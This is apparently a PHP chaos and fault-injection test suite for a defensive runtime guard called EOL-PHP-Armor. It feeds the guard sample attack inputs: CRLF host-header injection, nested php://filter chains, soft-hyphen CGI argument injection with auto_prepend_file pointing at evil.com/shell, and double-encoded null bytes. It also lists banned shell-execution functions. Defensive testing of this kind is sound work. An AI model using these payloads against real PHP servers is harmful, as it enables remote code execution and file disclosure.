<?php
/**
 * EOL-PHP-Armor Chaos & Resilience Test Suite
 * Simulates extreme and edge-case failure modes
 */

require_once dirname(__DIR__) . '/guard/runtime-armor.php';

echo "========================================================\n";
echo "   Running EOL-PHP-Armor Chaos & Fault Injection Tests\n";
echo "========================================================\n\n";

$passed = 0;
$failed = 0;

function run_test($name, callable $fn) {
    global $passed, $failed;
    echo "Testing {$name}... ";
    try {
        $fn();
        echo "\033[32m[PASS]\033[0m\n";
        $passed++;
    } catch (\Throwable $e) {
        echo "\033[31m[FAIL: " . $e->getMessage() . "]\033[0m\n";
        $failed++;
    }
}

// 1. Test Read-Only / Unwritable log path resilience
run_test("Read-Only Log Destination Fallback", function() {
    $shield = PhpArmorShield::boot();
    // Simulate non-existent / unwritable log directory
    $ref = new ReflectionClass($shield);
    $prop = $ref->getProperty('logFile');
    if (PHP_VERSION_ID < 80100) { $prop->setAccessible(true); }
    $prop->setValue($shield, '/proc/non_existent_unwritable_file_9999.log');

    // Trigger violation inspect without crash
    $inspect = $ref->getMethod('checkHostHeaders');
    if (PHP_VERSION_ID < 80100) { $inspect->setAccessible(true); }
    
    $_SERVER['HTTP_HOST'] = "bad-host.com\r\nX-Injected: true";
    $violation = $inspect->invoke($shield);
    assert($violation !== null, "Host header violation should be detected");
});

// 2. Test Deep Nested php://filter Obfuscation Evasion
run_test("Multi-Layered php://filter Evasion", function() {
    $shield = PhpArmorShield::boot();
    $ref = new ReflectionClass($shield);
    $check = $ref->getMethod('checkFilterChains');
    if (PHP_VERSION_ID < 80100) { $check->setAccessible(true); }

    $_SERVER['REQUEST_URI'] = '/index.php?file=php://filter/read=convert.base64-encode/resource=php://filter/read=convert.base64-decode/resource=secret.php';
    $v = $check->invoke($shield);
    assert($v !== null, "Multi-layered filter wrapper should be blocked");
    assert($v['rule'] === 'VEC3_FILTER_CHAIN_EXPLOIT');
});

// 3. Test Windows Soft-Hyphen Best-Fit Variations
run_test("Windows Soft-Hyphen (%AD / %ad / %C2%AD) Variations", function() {
    $shield = PhpArmorShield::boot();
    $ref = new ReflectionClass($shield);
    $check = $ref->getMethod('checkCgiInjection');
    if (PHP_VERSION_ID < 80100) { $check->setAccessible(true); }

    // Variation 1: Upper case %AD
    $_SERVER['QUERY_STRING'] = '%ADd+auto_prepend_file=http://evil.com/shell';
    $v1 = $check->invoke($shield);
    assert($v1 !== null, "%AD must be blocked");

    // Variation 2: UTF-8 2-byte encoded soft hyphen (0xC2 0xAD)
    $_SERVER['QUERY_STRING'] = '%C2%ADd+allow_url_include=1';
    $v2 = $check->invoke($shield);
    assert($v2 !== null, "%C2%AD overlong soft hyphen must be blocked");
});

// 4. Test Double URL-encoded Null Byte Injection
run_test("Double URL-Encoded Null Byte Evasion", function() {
    $shield = PhpArmorShield::boot();
    $ref = new ReflectionClass($shield);
    $check = $ref->getMethod('checkMailAndNullBytes');
    if (PHP_VERSION_ID < 80100) { $check->setAccessible(true); }

    // %2500 is double encoded %00
    $_GET = ['path' => 'uploads/image.jpg%2500.php'];
    $v = $check->invoke($shield);
    assert($v !== null, "Double encoded null byte should be blocked");
    assert($v['rule'] === 'VEC5_NULL_BYTE_POISONING');
});

// 5. Test Disable Functions Immunity
run_test("Zero-Dependency Immunity to disable_functions", function() {
    // Verify guard does not declare or rely on disabled process execution functions
    $guardCode = file_get_contents(dirname(__DIR__) . '/guard/runtime-armor.php');
    $banned = ['shell_exec', 'passthru', 'proc_open', 'popen', 'pcntl_exec'];
    foreach ($banned as $fn) {
        assert(strpos($guardCode, $fn . '(') === false, "Guard must never call {$fn}()");
    }
});

echo "\n--------------------------------------------------------\n";
echo "Chaos Results: {$passed} Passed, {$failed} Failed\n";
echo "--------------------------------------------------------\n";

if ($failed === 0) {
    echo "🎉 ALL CHAOS TESTS PASSED CLEANLY!\n";
    exit(0);
} else {
    exit(1);
}
